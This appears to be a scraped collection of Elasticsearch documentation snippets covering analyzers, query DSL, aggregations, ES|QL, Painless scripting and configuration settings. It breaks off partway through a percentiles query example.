Test\nDESCRIPTION: This is the response from the analyze API when using the smartcn_with_stop analyzer on Chinese text. It shows the tokens produced after applying the smartcn tokenizer and smartcn_stop filter, with stopwords removed and remaining tokens stemmed by the porter stemmer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-smartcn_stop.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"哈\",\n      \"start_offset\": 0,\n      \"end_offset\": 1,\n      \"type\": \"word\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"喽\",\n      \"start_offset\": 1,\n      \"end_offset\": 2,\n      \"type\": \"word\",\n      \"position\": 1\n    },\n    {\n      \"token\": \"我们\",\n      \"start_offset\": 3,\n      \"end_offset\": 5,\n      \"type\": \"word\",\n      \"position\": 3\n    },\n    {\n      \"token\": \"是\",\n      \"start_offset\": 5,\n      \"end_offset\": 6,\n      \"type\": \"word\",\n      \"position\": 4\n    },\n    {\n      \"token\": \"elast\",\n      \"start_offset\": 7,\n      \"end_offset\": 14,\n      \"type\": \"word\",\n      \"position\": 5\n    },\n    {\n      \"token\": \"我们\",\n      \"start_offset\": 17,\n      \"end_offset\": 19,\n      \"type\": \"word\",\n      \"position\": 6\n    },\n    {\n      \"token\": \"是\",\n      \"start_offset\": 19,\n      \"end_offset\": 20,\n      \"type\": \"word\",\n      \"position\": 7\n    },\n    {\n      \"token\": \"elast\",\n      \"start_offset\": 21,\n      \"end_offset\": 28,\n      \"type\": \"word\",\n      \"position\": 8\n    },\n    {\n      \"token\": \"elasticsearch\",\n      \"start_offset\": 35,\n      \"end_offset\": 48,\n      \"type\": \"word\",\n      \"position\": 11\n    },\n    {\n      \"token\": \"kibana\",\n      \"start_offset\": 49,\n      \"end_offset\": 55,\n      \"type\": \"word\",\n      \"position\": 13\n    },\n    {\n      \"token\": \"beat\",\n      \"start_offset\": 56,\n      \"end_offset\": 61,\n      \"type\": \"word\",\n      \"position\": 15\n    },\n    {\n      \"token\": \"和\",\n      \"start_offset\": 62,\n      \"end_offset\": 63,\n      \"type\": \"word\",\n      \"position\": 16\n    },\n    {\n      \"token\": \"logstash\",\n      \"start_offset\": 64,\n      \"end_offset\": 72,\n      \"type\": \"word\",\n      \"position\": 17\n    },\n    {\n      \"token\": \"开发\",\n      \"start_offset\": 74,\n      \"end_offset\": 76,\n      \"type\": \"word\",\n      \"position\": 20\n    },\n    {\n      \"token\": \"公司\",\n      \"start_offset\": 76,\n      \"end_offset\": 78,\n      \"type\": \"word\",\n      \"position\": 21\n    },\n    {\n      \"token\": \"从\",\n      \"start_offset\": 79,\n      \"end_offset\": 80,\n      \"type\": \"word\",\n      \"position\": 23\n    },\n    {\n      \"token\": \"股票\",\n      \"start_offset\": 80,\n      \"end_offset\": 82,\n      \"type\": \"word\",\n      \"position\": 24\n    },\n    {\n      \"token\": \"行情\",\n      \"start_offset\": 82,\n      \"end_offset\": 84,\n      \"type\": \"word\",\n      \"position\": 25\n    },\n    {\n      \"token\": \"到\",\n      \"start_offset\": 84,\n      \"end_offset\": 85,\n      \"type\": \"word\",\n      \"position\": 26\n    },\n    {\n      \"token\": \"twitter\",\n      \"start_offset\": 86,\n      \"end_offset\": 93,\n      \"type\": \"word\",\n      \"position\": 27\n    },\n    {\n      \"token\": \"消息\",\n      \"start_offset\": 94,\n      \"end_offset\": 96,\n      \"type\": \"word\",\n      \"position\": 28\n    },\n    {\n      \"token\": \"流\",\n      \"start_offset\": 96,\n      \"end_offset\": 97,\n      \"type\": \"word\",\n      \"position\": 29\n    },\n    {\n      \"token\": \"从\",\n      \"start_offset\": 98,\n      \"end_offset\": 99,\n      \"type\": \"word\",\n      \"position\": 31\n    },\n    {\n      \"token\": \"apach\",\n      \"start_offset\": 100,\n      \"end_offset\": 106,\n      \"type\": \"word\",\n      \"position\": 32\n    },\n    {\n      \"token\": \"日志\",\n      \"start_offset\": 107,\n      \"end_offset\": 109,\n      \"type\": \"word\",\n      \"position\": 33\n    },\n    {\n      \"token\": \"到\",\n      \"start_offset\": 109,\n      \"end_offset\": 110,\n      \"type\": \"word\",\n      \"position\": 34\n    },\n    {\n      \"token\": \"wordpress\",\n      \"start_offset\": 111,\n      \"end_offset\": 120,\n      \"type\": \"word\",\n      \"position\": 35\n    },\n    {\n      \"token\": \"博\",\n      \"start_offset\": 121,\n      \"end_offset\": 122,\n      \"type\": \"word\",\n      \"position\": 36\n    },\n    {\n      \"token\": \"文\",\n      \"start_offset\": 122,\n      \"end_offset\": 123,\n      \"type\": \"word\",\n      \"position\": 37\n    },\n    {\n      \"token\": \"我们\",\n      \"start_offset\": 124,\n      \"end_offset\": 126,\n      \"type\": \"word\",\n      \"position\": 39\n    },\n    {\n      \"token\": \"可以\",\n      \"start_offset\": 126,\n      \"end_offset\": 128,\n      \"type\": \"word\",\n      \"position\": 40\n    },\n    {\n      \"token\": \"帮助\",\n      \"start_offset\": 128,\n      \"end_offset\": 130,\n      \"type\": \"word\",\n      \"position\": 41\n    },\n    {\n      \"token\": \"人们\",\n      \"start_offset\": 130,\n      \"end_offset\": 132,\n      \"type\": \"word\",\n      \"position\": 42\n    },\n    {\n      \"token\": \"体验\",\n      \"start_offset\": 132,\n      \"end_offset\": 134,\n      \"type\": \"word\",\n      \"position\": 43\n    },\n    {\n      \"token\": \"搜索\",\n      \"start_offset\": 134,\n      \"end_offset\": 136,\n      \"type\": \"word\",\n      \"position\": 44\n    },\n    {\n      \"token\": \"强大\",\n      \"start_offset\": 137,\n      \"end_offset\": 139,\n      \"type\": \"word\",\n      \"position\": 46\n    },\n    {\n      \"token\": \"力量\",\n      \"start_offset\": 139,\n      \"end_offset\": 141,\n      \"type\": \"word\",\n      \"position\": 47\n    },\n    {\n      \"token\": \"帮助\",\n      \"start_offset\": 142,\n      \"end_offset\": 144,\n      \"type\": \"word\",\n      \"position\": 49\n    },\n    {\n      \"token\": \"他们\",\n      \"start_offset\": 144,\n      \"end_offset\": 146,\n      \"type\": \"word\",\n      \"position\": 50\n    },\n    {\n      \"token\": \"以\",\n      \"start_offset\": 146,\n      \"end_offset\": 147,\n      \"type\": \"word\",\n      \"position\": 51\n    },\n    {\n      \"token\": \"截然不同\",\n      \"start_offset\": 147,\n      \"end_offset\": 151,\n      \"type\": \"word\",\n      \"position\": 52\n    },\n    {\n      \"token\": \"方式\",\n      \"start_offset\": 152,\n      \"end_offset\": 154,\n      \"type\": \"word\",\n      \"position\": 54\n    },\n    {\n      \"token\": \"探索\",\n      \"start_offset\": 154,\n      \"end_offset\": 156,\n      \"type\": \"word\",\n      \"position\": 55\n    },\n    {\n      \"token\": \"和\",\n      \"start_offset\": 156,\n      \"end_offset\": 157,\n      \"type\": \"word\",\n      \"position\": 56\n    },\n    {\n      \"token\": \"分析\",\n      \"start_offset\": 157,\n      \"end_offset\": 159,\n      \"type\": \"word\",\n      \"position\": 57\n    },\n    {\n      \"token\": \"数据\",\n      \"start_offset\": 159,\n      \"end_offset\": 161,\n      \"type\": \"word\",\n      \"position\": 58\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Span Near\nDESCRIPTION: This code snippet demonstrates how to use the `span_near` query in Elasticsearch to find spans that are near each other within a document. The `clauses` array specifies the span queries to be matched, `slop` defines the maximum number of intervening positions, and `in_order` determines whether the matches must be in the specified order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-near-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_near\": {\n      \"clauses\": [\n        { \"span_term\": { \"field\": \"value1\" } },\n        { \"span_term\": { \"field\": \"value2\" } },\n        { \"span_term\": { \"field\": \"value3\" } }\n      ],\n      \"slop\": 12,\n      \"in_order\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Bengali Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Bengali analyzer, showing the configuration of Bengali-specific stopwords, keyword marking, and specialized normalization and stemming for Indic languages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /bengali_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"bengali_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_bengali_\" \n        },\n        \"bengali_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"উদাহরণ\"] \n        },\n        \"bengali_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"bengali\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_bengali\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"decimal_digit\",\n            \"bengali_keywords\",\n            \"indic_normalization\",\n            \"bengali_normalization\",\n            \"bengali_stop\",\n            \"bengali_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ID-based Sliced Scroll in Elasticsearch\nDESCRIPTION: Example of how to split a search into multiple slices using document IDs. This approach shows two slice requests (id 0 and 1) that together return all matching documents. The slicing is done first by shards and then locally using the _id field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?scroll=1m\n{\n  \"slice\": {\n    \"id\": 0,                      <1>\n    \"max\": 2                      <2>\n  },\n  \"query\": {\n    \"match\": {\n      \"message\": \"foo\"\n    }\n  }\n}\nGET /my-index-000001/_search?scroll=1m\n{\n  \"slice\": {\n    \"id\": 1,\n    \"max\": 2\n  },\n  \"query\": {\n    \"match\": {\n      \"message\": \"foo\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Ordering by Single Value Sub-aggregation in Elasticsearch\nDESCRIPTION: Example showing how to order buckets by a single value metrics sub-aggregation using the max play count of genres.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": {\n        \"field\": \"genre\",\n        \"order\": { \"max_play_count\": \"desc\" }\n      },\n      \"aggs\": {\n        \"max_play_count\": { \"max\": { \"field\": \"play_count\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LEFT Function in Elasticsearch SQL\nDESCRIPTION: Returns the leftmost specified number of characters from a string. Returns null if either input is null or an empty string if count is 0 or negative.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nLEFT(\n    string_exp, <1>\n    count)      <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LEFT('Elastic',3);\n\nLEFT('Elastic',3)\n-----------------\nEla\n```\n\n----------------------------------------\n\nTITLE: Span Multi-Term Query with Boost\nDESCRIPTION: Shows how to add a boost parameter to modify the relevance score of the span multi-term query\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-multi-term-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_multi\": {\n      \"match\": {\n        \"prefix\": { \"user.id\": { \"value\": \"ki\", \"boost\": 1.08 } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Counting Rows with Grouping in ESQL\nDESCRIPTION: This example shows how to count rows grouped by a column, using COUNT(*) and sorting the results. It demonstrates grouping and sorting operations in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS count = COUNT(*) BY languages\n| SORT languages DESC\n```\n\n----------------------------------------\n\nTITLE: Transforming Data in Elasticsearch Watch\nDESCRIPTION: A transform script that formats the execution time as an RFC 1123 formatted date and includes aggregations from the payload in the returned object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\ndef theDate = ZonedDateTime.ofInstant(ctx.execution_time.toInstant(), ctx.execution_time.getZone());\nreturn ['human_date': DateTimeFormatter.RFC_1123_DATE_TIME.format(theDate),\n        'aggregations': ctx.payload.aggregations]\n```\n\n----------------------------------------\n\nTITLE: Indexing Parent Documents with Join Field (Shortcut Notation) in Elasticsearch\nDESCRIPTION: Example of creating parent documents using a simplified shortcut notation. Instead of using the object notation, parent documents can simply specify the name of the relation directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"my_id\": \"1\",\n  \"text\": \"This is a question\",\n  \"my_join_field\": \"question\" <1>\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"my_id\": \"2\",\n  \"text\": \"This is another question\",\n  \"my_join_field\": \"question\"\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match with best_fields Type\nDESCRIPTION: This snippet demonstrates the `best_fields` type in a multi_match query. It searches for \"brown fox\" in the \"subject\" and \"message\" fields and uses the `tie_breaker` parameter to combine scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"brown fox\",\n      \"type\":       \"best_fields\",\n      \"fields\":     [ \"subject\", \"message\" ],\n      \"tie_breaker\": 0.3\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Case-Insensitive Regex Flag in Painless\nDESCRIPTION: Shows how to use the case-insensitive flag 'i' in a Painless regex pattern. This example checks if 'A' matches the pattern 'a' ignoring case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\n'A' ==~ /a/i\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Basic Settings\nDESCRIPTION: Core SSL configuration properties for private keys, certificates and certificate authorities. These settings enable basic SSL/TLS functionality for JWT realm communication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_16\n\nLANGUAGE: properties\nCODE:\n```\nssl.key=<path-to-key-file>\nssl.key_passphrase=<passphrase>\nssl.secure_key_passphrase=<secure-passphrase>\nssl.certificate=<path-to-cert>\nssl.certificate_authorities=<path-to-ca-certs>\n```\n\n----------------------------------------\n\nTITLE: Listing Elasticsearch Users\nDESCRIPTION: Example demonstrating how to list all users registered in the file realm showing their assigned roles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users list\nrdeniro        : admin\nalpacino       : power_user\njacknich       : monitoring,network\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Stemmer Filter in Elasticsearch\nDESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the stemmer filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"stemmer\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SAML Keystore Configuration\nDESCRIPTION: Configuration settings for setting up a keystore for SAML signing, including path, type, alias and password configurations. Can be configured using either JKS or PKCS12 format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nsigning.keystore.path: \"path/to/keystore\"\nsigning.keystore.type: \"jks\"\nsigning.keystore.alias: \"saml-key\"\nsigning.keystore.secure_password: \"${KEYSTORE_PASSWORD}\"\n```\n\n----------------------------------------\n\nTITLE: Creating an HDFS Repository with Kerberos Authentication\nDESCRIPTION: Shows how to configure a secure HDFS repository with Kerberos authentication by specifying the security.principal in the repository settings. This example uses a static principal name for all nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs-security.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT _snapshot/my_hdfs_repository\n{\n  \"type\": \"hdfs\",\n  \"settings\": {\n    \"uri\": \"hdfs://namenode:8020/\",\n    \"path\": \"/user/elasticsearch/repositories/my_hdfs_repository\",\n    \"security.principal\": \"elasticsearch@REALM\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Grouping Sales by Type with Top Hits in Elasticsearch\nDESCRIPTION: This example demonstrates how to group sales by type and show the last sale for each type, including only the date and price fields in the source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"aggs\": {\n    \"top_tags\": {\n      \"terms\": {\n        \"field\": \"type\",\n        \"size\": 3\n      },\n      \"aggs\": {\n        \"top_sales_hits\": {\n          \"top_hits\": {\n            \"sort\": [\n              {\n                \"date\": {\n                  \"order\": \"desc\"\n                }\n              }\n            ],\n            \"_source\": {\n              \"includes\": [ \"date\", \"price\" ]\n            },\n            \"size\": 1\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing User Parameters as Datetime in Painless\nDESCRIPTION: This snippet shows how to handle datetime input from user parameters within a Painless script by parsing numeric and string datetimes to complex objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_17\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  ...\n  \"script\": {\n      ...\n      \"params\": {\n          \"input_datetime\": 434931327000\n      }\n  }\n  ...\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nlong inputDateTime = params['input_datetime'];\nInstant instant = Instant.ofEpochMilli(inputDateTime);\nZonedDateTime zdt = ZonedDateTime.ofInstant(instant, ZoneId.of('Z'));\n```\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  ...\n  \"script\": {\n      ...\n      \"params\": {\n          \"input_datetime\": \"custom y 1983 m 10 d 13 22:15:30 Z\"\n      }\n  }\n  ...\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nString datetime = params['input_datetime'];\nDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\n        \"'custom' 'y' yyyy 'm' MM 'd' dd HH:mm:ss VV\");\nZonedDateTime zdt = ZonedDateTime.parse(datetime, dtf); <1>\n```\n\n----------------------------------------\n\nTITLE: Configuring Maximum Merge Threads in Elasticsearch YAML\nDESCRIPTION: Sets the maximum number of threads that can perform merge operations on a single shard simultaneously. The default value is calculated based on the number of processors, with a minimum of 1 and maximum of 4. For spinning disk drives, it's recommended to set this to 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/merge.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.merge.scheduler.max_thread_count: Math.max(1, Math.min(4, <<node.processors, node.processors>> / 2))\n```\n\n----------------------------------------\n\nTITLE: Concatenating Multi-Value Fields with MV_APPEND in ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of the MV_APPEND function to combine values from 'birth_date' and 'hire_date' fields into a new 'dates' field. It filters employees, sorts them, and keeps specific fields in the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_append.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE emp_no == 10039 OR emp_no == 10040\n| SORT emp_no\n| EVAL dates = MV_APPEND(birth_date, hire_date)\n| KEEP emp_no, birth_date, hire_date, dates\n```\n\n----------------------------------------\n\nTITLE: Configuring Search Slow Log Settings in YAML\nDESCRIPTION: This snippet shows how to configure search slow log settings in the log4j2.properties file using YAML format. It sets thresholds for different log levels and enables user information inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nindex.search.slowlog.threshold.query.warn: 10s\nindex.search.slowlog.threshold.query.info: 5s\nindex.search.slowlog.threshold.query.debug: 2s\nindex.search.slowlog.threshold.query.trace: 500ms\n\nindex.search.slowlog.threshold.fetch.warn: 1s\nindex.search.slowlog.threshold.fetch.info: 800ms\nindex.search.slowlog.threshold.fetch.debug: 500ms\nindex.search.slowlog.threshold.fetch.trace: 200ms\n\nindex.search.slowlog.include.user: true\n```\n\n----------------------------------------\n\nTITLE: Setting Highlighter Type in Elasticsearch\nDESCRIPTION: This snippet shows how to force a specific highlighter type using the 'type' field. The example forces the use of the plain highlighter for the comment field, though unified and fvh highlighter types are also available.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"comment\": { \"type\": \"plain\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Counting Split Values with Inline Function in ESQL\nDESCRIPTION: This snippet illustrates how to use an inline function (SPLIT) within the COUNT function to count the number of values after splitting a string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nROW words=\"foo;bar;baz;qux;quux;foo\"\n| STATS word_count = COUNT(SPLIT(words, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Scripted Metric Aggregation Response in Elasticsearch\nDESCRIPTION: This snippet shows the response format for a scripted metric aggregation, including the computed profit value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 218,\n  ...\n  \"aggregations\": {\n    \"profit\": {\n      \"value\": 240.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Non-keyed Response with Bucket Sort in Elasticsearch Filters Aggregation\nDESCRIPTION: This example shows how to use the 'keyed: false' parameter to return buckets as an array instead of an object, allowing for proper sorting with bucket_sort aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filters-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"the_filter\": {\n      \"filters\": {\n        \"keyed\": false,\n        \"filters\": {\n          \"t-shirt\": { \"term\": { \"type\": \"t-shirt\" } },\n          \"hat\": { \"term\": { \"type\": \"hat\" } }\n        }\n      },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } },\n        \"sort_by_avg_price\": {\n          \"bucket_sort\": { \"sort\": { \"avg_price\": \"asc\" } }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"aggregations\": {\n    \"the_filter\": {\n      \"buckets\": [\n        {\n          \"key\": \"t-shirt\",\n          \"doc_count\": 3,\n          \"avg_price\": { \"value\": 128.33333333333334 }\n        },\n        {\n          \"key\": \"hat\",\n          \"doc_count\": 3,\n          \"avg_price\": { \"value\": 150.0 }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Normalize Aggregation in Elasticsearch\nDESCRIPTION: Example of a basic Normalize aggregation structure in Elasticsearch, specifying the buckets_path and normalization method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-normalize-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"normalize\": {\n    \"buckets_path\": \"normalized\",\n    \"method\": \"percent_of_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Multi-level Nested Documents\nDESCRIPTION: The code demonstrates a multi-level nested query on a 'drivers' index, matching documents based on nested fields 'make' and 'model' of vehicles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /drivers/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"driver\",\n      \"query\": {\n        \"nested\": {\n          \"path\": \"driver.vehicle\",\n          \"query\": {\n            \"bool\": {\n              \"must\": [\n                { \"match\": { \"driver.vehicle.make\": \"Powell Motors\" } },\n                { \"match\": { \"driver.vehicle.model\": \"Canyonero\" } }\n              ]\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Code Analysis Configuration - Elasticsearch Pattern Capture\nDESCRIPTION: Elasticsearch configuration for analyzing camelCase code using pattern capture filter\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n   \"settings\" : {\n      \"analysis\" : {\n         \"filter\" : {\n            \"code\" : {\n               \"type\" : \"pattern_capture\",\n               \"preserve_original\" : true,\n               \"patterns\" : [\n                  \"(\\\\p{Ll}+|\\\\p{Lu}\\\\p{Ll}+|\\\\p{Lu}+)\",\n                  \"(\\\\d+)\"\n               ]\n            }\n         },\n         \"analyzer\" : {\n            \"code\" : {\n               \"tokenizer\" : \"pattern\",\n               \"filter\" : [ \"code\", \"lowercase\" ]\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Version-Specific JVM Configuration\nDESCRIPTION: Demonstrates how to apply JVM settings to specific Java versions or version ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n17:-Xmx2g\n```\n\nLANGUAGE: text\nCODE:\n```\n17-18:-Xmx2g\n```\n\nLANGUAGE: text\nCODE:\n```\n17-:-Xmx2g\n```\n\n----------------------------------------\n\nTITLE: Creating an Elastic Rerank Inference Endpoint\nDESCRIPTION: This code creates an inference endpoint for the Elastic Rerank model using the Elasticsearch service. It configures adaptive allocations to automatically scale from 1 to 10 allocations based on usage, making the model available for text similarity reranking operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT _inference/rerank/my-elastic-rerank\n{\n  \"service\": \"elasticsearch\",\n  \"service_settings\": {\n    \"model_id\": \".rerank-v1\",\n    \"num_threads\": 1,\n    \"adaptive_allocations\": { <1>\n      \"enabled\": true,\n      \"min_number_of_allocations\": 1,\n      \"max_number_of_allocations\": 10\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Result Document after Object Array Processing\nDESCRIPTION: The resulting document after the Foreach processor has removed the id field from each person object in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"persons\" : [\n    {\n      \"name\" : \"John Doe\"\n    },\n    {\n      \"name\" : \"Jane Doe\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Grouping Geo-Line Data with Terms Aggregation in Elasticsearch\nDESCRIPTION: Example of using terms aggregation to group geo-line data by city name. The query aggregates location data and sorts it by timestamp to create geographic line strings for each city.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /tour/_search?filter_path=aggregations\n{\n  \"aggregations\": {\n    \"path\": {\n      \"terms\": {\"field\": \"city\"},\n      \"aggregations\": {\n        \"museum_tour\": {\n          \"geo_line\": {\n            \"point\": {\"field\": \"location\"},\n            \"sort\": {\"field\": \"@timestamp\"}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Percentiles Range Query\nDESCRIPTION: Query specifying custom percentile values (95,99,99.9) to calculate for outlier detection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": 